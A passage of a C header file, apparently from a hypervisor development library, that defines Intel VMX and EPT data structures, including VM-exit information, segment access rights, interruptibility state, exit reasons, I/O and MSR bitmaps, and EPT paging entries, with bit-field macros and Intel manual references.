#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER_BIT 10
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER_FLAG 0x400
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER(_) (((_) >> 10) & 0x01)
        UINT64 Reserved2 : 4;

        /**
         * @brief Segment register
         *
         * [Bits 17:15] 0: ES
         * 1: CS
         * 2: SS
         * 3: DS
         * 4: FS
         * 5: GS
         * Other values not used. Undefined for register instructions (bit 10 is set).
         */
        UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

        /**
         * [Bits 21:18] General-purpose register. Undefined for register instructions (bit 10 is set) and for memory instructions
         * with no index register (bit 10 is clear and bit 22 is set).
         */
        UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

        /**
         * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid). Undefined for register instructions (bit 10 is set).
         */
        UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID(_) (((_) >> 22) & 0x01)

        /**
         * [Bits 26:23] BaseReg (encoded as Reg1 above). Undefined for register instructions (bit 10 is set) and for memory
         * instructions with no base register (bit 10 is clear and bit 27 is set).
         */
        UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER(_)  (((_) >> 23) & 0x0F)

        /**
         * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
         */
        UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

        /**
         * [Bits 31:28] Reg2 (same encoding as IndexReg above).
         */
        UINT64 Register2 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2_BIT    28
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2_FLAG   0xF0000000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2_MASK   0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2(_)     (((_) >> 28) & 0x0F)
        UINT64 Reserved3 : 32;
    };

    UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE;

/**
 * @}
 */

 /**
  * @brief - The low 16 bits correspond to bits 23:8 of the upper 32 bits of a 64-bit segment descriptor. While bits 19:16
  *        of code-segment and data-segment descriptors correspond to the upper 4 bits of the segment limit, the corresponding bits
  *        (bits 11:8) are reserved in this VMCS field.
  *        - Bit 16 indicates an unusable segment. Attempts to use such a segment fault except in 64-bit mode. In general, a
  *        segment register is unusable if it has been loaded with a null selector.
  *        - Bits 31:17 are reserved
  *
  * @note There are a few exceptions to this statement. For example, a segment with a non-null selector may be unusable
  *       following a task switch that fails after its commit point. In contrast, the TR register is usable after processor reset
  *       despite having a null selector
  * @see SEGMENT_DESCRIPTOR_32
  * @see SEGMENT_DESCRIPTOR_64
  * @see XXX_ACCESS_RIGHTS fields of 32_BIT_GUEST_STATE_FIELDS
  * @see Vol3C[24.4.2(Guest Non-Register State)] (reference)
  */
typedef union
{
    struct
    {
        /**
         * [Bits 3:0] Segment type.
         */
        UINT32 Type : 4;
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE_BIT                           0
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE_FLAG                          0x0F
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE_MASK                          0x0F
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE(_)                            (((_) >> 0) & 0x0F)

        /**
         * [Bit 4] S - Descriptor type (0 = system; 1 = code or data).
         */
        UINT32 DescriptorType : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_BIT                4
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_FLAG               0x10
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_MASK               0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE(_)                 (((_) >> 4) & 0x01)

        /**
         * [Bits 6:5] DPL - Descriptor privilege level.
         */
        UINT32 DescriptorPrivilegeLevel : 2;
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_BIT     5
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_FLAG    0x60
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_MASK    0x03
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL(_)      (((_) >> 5) & 0x03)

        /**
         * [Bit 7] P - Segment present.
         */
        UINT32 Present : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT_BIT                        7
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT_FLAG                       0x80
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT_MASK                       0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT(_)                         (((_) >> 7) & 0x01)
        UINT32 Reserved1 : 4;

        /**
         * [Bit 12] AVL - Available for use by system software.
         */
        UINT32 AvailableBit : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT_BIT                  12
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT_FLAG                 0x1000
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT_MASK                 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT(_)                   (((_) >> 12) & 0x01)

        /**
         * [Bit 13] Reserved (except for CS). L - 64-bit mode active (for CS only).
         */
        UINT32 LongMode : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE_BIT                      13
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE_FLAG                     0x2000
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE_MASK                     0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE(_)                       (((_) >> 13) & 0x01)

        /**
         * [Bit 14] D/B - Default operation size (0 = 16-bit segment; 1 = 32-bit segment).
         */
        UINT32 DefaultBig : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_BIT                    14
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_FLAG                   0x4000
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_MASK                   0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG(_)                     (((_) >> 14) & 0x01)

        /**
         * [Bit 15] G - Granularity.
         */
        UINT32 Granularity : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY_BIT                    15
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY_FLAG                   0x8000
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY_MASK                   0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY(_)                     (((_) >> 15) & 0x01)

        /**
         * [Bit 16] Segment unusable (0 = usable; 1 = unusable).
         */
        UINT32 Unusable : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE_BIT                       16
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE_FLAG                      0x10000
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE_MASK                      0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE(_)                        (((_) >> 16) & 0x01)
        UINT32 Reserved2 : 15;
    };

    UINT32 Flags;
} VMX_SEGMENT_ACCESS_RIGHTS;

/**
 * @brief The IA-32 architecture includes features that permit certain events to be blocked for a period of time. This
 *        field contains information about such blocking
 *
 * @see INTERRUPTIBILITY_STATE of 32_BIT_GUEST_STATE_FIELDS
 * @see Vol3C[24.4.2(Guest Non-Register State)] (reference)
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Execution of STI with RFLAGS.IF = 0 blocks maskable interrupts on the instruction boundary following its
         * execution.1 Setting this bit indicates that this blocking is in effect.
         *
         * @see Vol2B[4(STI-Set Interrupt Flag)]
         */
        UINT32 BlockingBySti : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI_BIT               0
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI_FLAG              0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI_MASK              0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI(_)                (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Execution of a MOV to SS or a POP to SS blocks or suppresses certain debug exceptions as well as interrupts
         * (maskable and nonmaskable) on the instruction boundary following its execution. Setting this bit indicates that this
         * blocking is in effect. This document uses the term "blocking by MOV SS," but it applies equally to POP SS.
         *
         * @see Vol3A[6.8.3(Masking Exceptions and Interrupts When Switching Stacks)]
         */
        UINT32 BlockingByMovSs : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS_BIT            1
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS_FLAG           0x02
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS_MASK           0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS(_)             (((_) >> 1) & 0x01)

        /**
         * [Bit 2] System-management interrupts (SMIs) are disabled while the processor is in system-management mode (SMM). Setting
         * this bit indicates that blocking of SMIs is in effect.
         *
         * @see Vol3C[34.2(System Management Interrupt (SMI))]
         */
        UINT32 BlockingBySmi : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI_BIT               2
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI_FLAG              0x04
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI_MASK              0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI(_)                (((_) >> 2) & 0x01)

        /**
         * [Bit 3] Delivery of a non-maskable interrupt (NMI) or a system-management interrupt (SMI) blocks subsequent NMIs until
         * the next execution of IRET. Setting this bit indicates that blocking of NMIs is in effect. Clearing this bit does not
         * imply that NMIs are not (temporarily) blocked for other reasons. If the "virtual NMIs" VM-execution control is 1, this
         * bit does not control the blocking of NMIs. Instead, it refers to "virtual-NMI blocking" (the fact that guest software is
         * not ready for an NMI).
         *
         * @see Vol3C[6.7.1(Handling Multiple NMIs)]
         * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
         * @see Vol3C[24.6.1(Pin-Based VM-Execution Controls)]
         */
        UINT32 BlockingByNmi : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI_BIT               3
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI_FLAG              0x08
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI_MASK              0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI(_)                (((_) >> 3) & 0x01)

        /**
         * [Bit 4] A VM exit saves this bit as 1 to indicate that the VM exit was incident to enclave mode.
         */
        UINT32 EnclaveInterruption : 1;
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION_BIT          4
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION_FLAG         0x10
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION_MASK         0x01
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION(_)           (((_) >> 4) & 0x01)
        UINT32 Reserved1 : 27;
    };

    UINT32 Flags;
} VMX_INTERRUPTIBILITY_STATE;

typedef enum
{
    /**
     * The logical processor is executing instructions normally.
     */
    VmxActive = 0x00000000,

    /**
     * The logical processor is inactive because it executed the HLT instruction.
     */
    VmxHlt = 0x00000001,

    /**
     * The logical processor is inactive because it incurred a triple fault1 or some other serious error.
     */
    VmxShutdown = 0x00000002,

    /**
     * The logical processor is inactive because it is waiting for a startup-IPI (SIPI).
     */
    VmxWaitForSipi = 0x00000003,
} VMX_GUEST_ACTIVITY_STATE;

/**
 * @}
 */

 /**
  * @brief Format of Exit Reason
  *
  * Exit reason (32 bits). This field encodes the reason for the VM exit and has the structure.
  *
  * @see Vol3C[24.9.1(Basic VM-Exit Information)] (reference)
  */
typedef union
{
    struct
    {
        /**
         * [Bits 15:0] Provides basic information about the cause of the VM exit (if bit 31 is clear) or of the VM-entry failure
         * (if bit 31 is set).
         */
        UINT32 BasicExitReason : 16;
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON_BIT                      0
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON_FLAG                     0xFFFF
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON_MASK                     0xFFFF
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON(_)                       (((_) >> 0) & 0xFFFF)

        /**
         * [Bit 16] Always cleared to 0.
         */
        UINT32 Always0 : 1;
#define VMX_VMEXIT_REASON_ALWAYS0_BIT                                16
#define VMX_VMEXIT_REASON_ALWAYS0_FLAG                               0x10000
#define VMX_VMEXIT_REASON_ALWAYS0_MASK                               0x01
#define VMX_VMEXIT_REASON_ALWAYS0(_)                                 (((_) >> 16) & 0x01)
        UINT32 Reserved1 : 10;
#define VMX_VMEXIT_REASON_RESERVED1_BIT                              17
#define VMX_VMEXIT_REASON_RESERVED1_FLAG                             0x7FE0000
#define VMX_VMEXIT_REASON_RESERVED1_MASK                             0x3FF
#define VMX_VMEXIT_REASON_RESERVED1(_)                               (((_) >> 17) & 0x3FF)

        /**
         * [Bit 27] A VM exit saves this bit as 1 to indicate that the VM exit was incident to enclave mode.
         */
        UINT32 EnclaveMode : 1;
#define VMX_VMEXIT_REASON_ENCLAVE_MODE_BIT                           27
#define VMX_VMEXIT_REASON_ENCLAVE_MODE_FLAG                          0x8000000
#define VMX_VMEXIT_REASON_ENCLAVE_MODE_MASK                          0x01
#define VMX_VMEXIT_REASON_ENCLAVE_MODE(_)                            (((_) >> 27) & 0x01)

        /**
         * [Bit 28] Pending MTF VM exit.
         */
        UINT32 PendingMtfVmExit : 1;
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT_BIT                    28
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT_FLAG                   0x10000000
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT_MASK                   0x01
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT(_)                     (((_) >> 28) & 0x01)

        /**
         * [Bit 29] VM exit from VMX root operation.
         */
        UINT32 VmExitFromVmxRoor : 1;
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR_BIT                  29
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR_FLAG                 0x20000000
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR_MASK                 0x01
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR(_)                   (((_) >> 29) & 0x01)
        UINT32 Reserved2 : 1;
#define VMX_VMEXIT_REASON_RESERVED2_BIT                              30
#define VMX_VMEXIT_REASON_RESERVED2_FLAG                             0x40000000
#define VMX_VMEXIT_REASON_RESERVED2_MASK                             0x01
#define VMX_VMEXIT_REASON_RESERVED2(_)                               (((_) >> 30) & 0x01)

        /**
         * [Bit 31] VM-entry failure:
         *   - 0 = true VM exit
         *   - 1 = VM-entry failure
         */
        UINT32 VmEntryFailure : 1;
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE_BIT                       31
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE_FLAG                      0x80000000
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE_MASK                      0x01
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE(_)                        (((_) >> 31) & 0x01)
    };

    UINT32 Flags;
} VMX_VMEXIT_REASON;

typedef struct
{
#define IO_BITMAP_A_MIN                                              0x00000000
#define IO_BITMAP_A_MAX                                              0x00007FFF
#define IO_BITMAP_B_MIN                                              0x00008000
#define IO_BITMAP_B_MAX                                              0x0000FFFF
    UINT8 IoA[4096];
    UINT8 IoB[4096];
} VMX_IO_BITMAP;

typedef struct
{
#define MSR_ID_LOW_MIN                                               0x00000000
#define MSR_ID_LOW_MAX                                               0x00001FFF
#define MSR_ID_HIGH_MIN                                              0xC0000000
#define MSR_ID_HIGH_MAX                                              0xC0001FFF
    UINT8 RdmsrLow[1024];
    UINT8 RdmsrHigh[1024];
    UINT8 WrmsrLow[1024];
    UINT8 WrmsrHigh[1024];
} VMX_MSR_BITMAP;

/**
 * @defgroup EPT \
 *           The extended page-table mechanism
 *
 * The extended page-table mechanism (EPT) is a feature that can be used to support the virtualization of physical memory.
 * When EPT is in use, certain addresses that would normally be treated as physical addresses (and used to access memory)
 * are instead treated as guest-physical addresses. Guest-physical addresses are translated by traversing a set of EPT
 * paging structures to produce physical addresses that are used to access memory.
 *
 * @see Vol3C[28.2(THE EXTENDED PAGE TABLE MECHANISM (EPT))] (reference)
 * @{
 */
 /**
  * @brief Extended-Page-Table Pointer (EPTP)
  *
  * The extended-page-table pointer (EPTP) contains the address of the base of EPT PML4 table, as well as other EPT
  * configuration information.
  *
  * @see Vol3C[28.2.2(EPT Translation Mechanism]
  * @see Vol3C[24.6.11(Extended-Page-Table Pointer (EPTP)] (reference)
  */
typedef union
{
    struct
    {
        /**
         * [Bits 2:0] EPT paging-structure memory type:
         * - 0 = Uncacheable (UC)
         * - 6 = Write-back (WB)
         * Other values are reserved.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 MemoryType : 3;
#define EPT_POINTER_MEMORY_TYPE_BIT                                  0
#define EPT_POINTER_MEMORY_TYPE_FLAG                                 0x07
#define EPT_POINTER_MEMORY_TYPE_MASK                                 0x07
#define EPT_POINTER_MEMORY_TYPE(_)                                   (((_) >> 0) & 0x07)

        /**
         * [Bits 5:3] This value is 1 less than the EPT page-walk length.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 PageWalkLength : 3;
#define EPT_POINTER_PAGE_WALK_LENGTH_BIT                             3
#define EPT_POINTER_PAGE_WALK_LENGTH_FLAG                            0x38
#define EPT_POINTER_PAGE_WALK_LENGTH_MASK                            0x07
#define EPT_POINTER_PAGE_WALK_LENGTH(_)                              (((_) >> 3) & 0x07)
#define EPT_PAGE_WALK_LENGTH_4                                       0x00000003

        /**
         * [Bit 6] Setting this control to 1 enables accessed and dirty flags for EPT.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 EnableAccessAndDirtyFlags : 1;
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS_BIT                6
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS_FLAG               0x40
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS_MASK               0x01
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS(_)                 (((_) >> 6) & 0x01)
        UINT64 Reserved1 : 5;

        /**
         * [Bits 47:12] Bits N-1:12 of the physical address of the 4-KByte aligned EPT PML4 table.
         */
        UINT64 PageFrameNumber : 36;
#define EPT_POINTER_PAGE_FRAME_NUMBER_BIT                            12
#define EPT_POINTER_PAGE_FRAME_NUMBER_FLAG                           0xFFFFFFFFF000
#define EPT_POINTER_PAGE_FRAME_NUMBER_MASK                           0xFFFFFFFFF
#define EPT_POINTER_PAGE_FRAME_NUMBER(_)                             (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved2 : 16;
    };

    UINT64 Flags;
} EPT_POINTER;

/**
 * @brief Format of an EPT PML4 Entry (PML4E) that References an EPT Page-Directory-Pointer Table
 *
 * A 4-KByte naturally aligned EPT PML4 table is located at the physical address specified in bits 51:12 of the
 * extended-page-table pointer (EPTP), a VM-execution control field. An EPT PML4 table comprises 512 64-bit entries (EPT
 * PML4Es). An EPT PML4E is selected using the physical address defined as follows:
 * - Bits 63:52 are all 0.
 * - Bits 51:12 are from the EPTP.
 * - Bits 11:3 are bits 47:39 of the guest-physical address.
 * - Bits 2:0 are all 0.
 * Because an EPT PML4E is identified using bits 47:39 of the guest-physical address, it controls access to a 512- GByte
 * region of the guest-physical-address space.
 *
 * @see Vol3C[24.6.11(Extended-Page-Table Pointer (EPTP)]
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Read access; indicates whether reads are allowed from the 512-GByte region controlled by this entry.
         */
        UINT64 ReadAccess : 1;
#define EPT_PML4_READ_ACCESS_BIT                                     0
#define EPT_PML4_READ_ACCESS_FLAG                                    0x01
#define EPT_PML4_READ_ACCESS_MASK                                    0x01
#define EPT_PML4_READ_ACCESS(_)                                      (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Write access; indicates whether writes are allowed from the 512-GByte region controlled by this entry.
         */
        UINT64 WriteAccess : 1;
#define EPT_PML4_WRITE_ACCESS_BIT                                    1
#define EPT_PML4_WRITE_ACCESS_FLAG                                   0x02
#define EPT_PML4_WRITE_ACCESS_MASK                                   0x01
#define EPT_PML4_WRITE_ACCESS(_)                                     (((_) >> 1) & 0x01)

        /**
         * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute access; indicates whether
         * instruction fetches are allowed from the 512-GByte region controlled by this entry.
         * If that control is 1, execute access for supervisor-mode linear addresses; indicates whether instruction fetches are
         * allowed from supervisor-mode linear addresses in the 512-GByte region controlled by this entry.
         */
        UINT64 ExecuteAccess : 1;
#define EPT_PML4_EXECUTE_ACCESS_BIT                                  2
#define EPT_PML4_EXECUTE_ACCESS_FLAG                                 0x04
#define EPT_PML4_EXECUTE_ACCESS_MASK                                 0x01
#define EPT_PML4_EXECUTE_ACCESS(_)                                   (((_) >> 2) & 0x01)
        UINT64 Reserved1 : 5;

        /**
         * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed the 512-GByte region
         * controlled by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Accessed : 1;
#define EPT_PML4_ACCESSED_BIT                                        8
#define EPT_PML4_ACCESSED_FLAG                                       0x100
#define EPT_PML4_ACCESSED_MASK                                       0x01
#define EPT_PML4_ACCESSED(_)                                         (((_) >> 8) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * [Bit 10] Execute access for user-mode linear addresses. If the "mode-based execute control for EPT" VM-execution control
         * is 1, indicates whether instruction fetches are allowed from user-mode linear addresses in the 512-GByte region
         * controlled by this entry. If that control is 0, this bit is ignored.
         */
        UINT64 UserModeExecute : 1;
#define EPT_PML4_USER_MODE_EXECUTE_BIT                               10
#define EPT_PML4_USER_MODE_EXECUTE_FLAG                              0x400
#define EPT_PML4_USER_MODE_EXECUTE_MASK                              0x01
#define EPT_PML4_USER_MODE_EXECUTE(_)                                (((_) >> 10) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * [Bits 47:12] Physical address of 4-KByte aligned EPT page-directory-pointer table referenced by this entry.
         */
        UINT64 PageFrameNumber : 36;
#define EPT_PML4_PAGE_FRAME_NUMBER_BIT                               12
#define EPT_PML4_PAGE_FRAME_NUMBER_FLAG                              0xFFFFFFFFF000
#define EPT_PML4_PAGE_FRAME_NUMBER_MASK                              0xFFFFFFFFF
#define EPT_PML4_PAGE_FRAME_NUMBER(_)                                (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved4 : 16;
    };

    UINT64 Flags;
} EPT_PML4;

/**
 * @brief Format of an EPT Page-Directory-Pointer-Table Entry (PDPTE) that Maps a 1-GByte Page
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Read access; indicates whether reads are allowed from the 1-GByte page referenced by this entry.
         */
        UINT64 ReadAccess : 1;
#define EPDPTE_1GB_READ_ACCESS_BIT                                   0
#define EPDPTE_1GB_READ_ACCESS_FLAG                                  0x01
#define EPDPTE_1GB_READ_ACCESS_MASK                                  0x01
#define EPDPTE_1GB_READ_ACCESS(_)                                    (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Write access; indicates whether writes are allowed from the 1-GByte page referenced by this entry.
         */
        UINT64 WriteAccess : 1;
#define EPDPTE_1GB_WRITE_ACCESS_BIT                                  1
#define EPDPTE_1GB_WRITE_ACCESS_FLAG                                 0x02
#define EPDPTE_1GB_WRITE_ACCESS_MASK                                 0x01
#define EPDPTE_1GB_WRITE_ACCESS(_)                                   (((_) >> 1) & 0x01)

        /**
         * [Bit 2] If the "mode-based execute control for EPT" VM-execution control is 0, execute access; indicates whether
         * instruction fetches are allowed from the 1-GByte page controlled by this entry.
         * If that control is 1, execute access for supervisor-mode linear addresses; indicates whether instruction fetches are
         * allowed from supervisor-mode linear addresses in the 1-GByte page controlled by this entry.
         */
        UINT64 ExecuteAccess : 1;
#define EPDPTE_1GB_EXECUTE_ACCESS_BIT                                2
#define EPDPTE_1GB_EXECUTE_ACCESS_FLAG                               0x04
#define EPDPTE_1GB_EXECUTE_ACCESS_MASK                               0x01
#define EPDPTE_1GB_EXECUTE_ACCESS(_)                                 (((_) >> 2) & 0x01)

        /**
         * [Bits 5:3] EPT memory type for this 1-GByte page.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 MemoryType : 3;
#define EPDPTE_1GB_MEMORY_TYPE_BIT                                   3
#define EPDPTE_1GB_MEMORY_TYPE_FLAG                                  0x38
#define EPDPTE_1GB_MEMORY_TYPE_MASK                                  0x07
#define EPDPTE_1GB_MEMORY_TYPE(_)                                    (((_) >> 3) & 0x07)

        /**
         * [Bit 6] Ignore PAT memory type for this 1-GByte page.
         *
         * @see Vol3C[28.2.6(EPT and memory Typing)]
         */
        UINT64 IgnorePat : 1;
#define EPDPTE_1GB_IGNORE_PAT_BIT                                    6
#define EPDPTE_1GB_IGNORE_PAT_FLAG                                   0x40
#define EPDPTE_1GB_IGNORE_PAT_MASK                                   0x01
#define EPDPTE_1GB_IGNORE_PAT(_)                                     (((_) >> 6) & 0x01)

        /**
         * [Bit 7] Must be 1 (otherwise, this entry references an EPT page directory).
         */
        UINT64 LargePage : 1;
#define EPDPTE_1GB_LARGE_PAGE_BIT                                    7
#define EPDPTE_1GB_LARGE_PAGE_FLAG                                   0x80
#define EPDPTE_1GB_LARGE_PAGE_MASK                                   0x01
#define EPDPTE_1GB_LARGE_PAGE(_)                                     (((_) >> 7) & 0x01)

        /**
         * [Bit 8] If bit 6 of EPTP is 1, accessed flag for EPT; indicates whether software has accessed the 1-GByte page
         * referenced by this entry. Ignored if bit 6 of EPTP is 0.
         *
         * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
         */
        UINT64 Accessed : 1;
#define EPDPTE_1GB_ACCESSED_BIT                                      8
#define EPDPTE_1GB_ACCESSED_FLAG                                     0x100
#define EPDPTE_1GB_ACCESSED_MASK                                     0x01
#define EPDPTE_1GB_ACCESSED(_)                                       (((_) >> 8) & 0x01)

        /**
         * [Bit 9] If bit 6 of EPTP is 1, dirty flag for EPT; indicates whether software has written to the 1-GByte page referenced
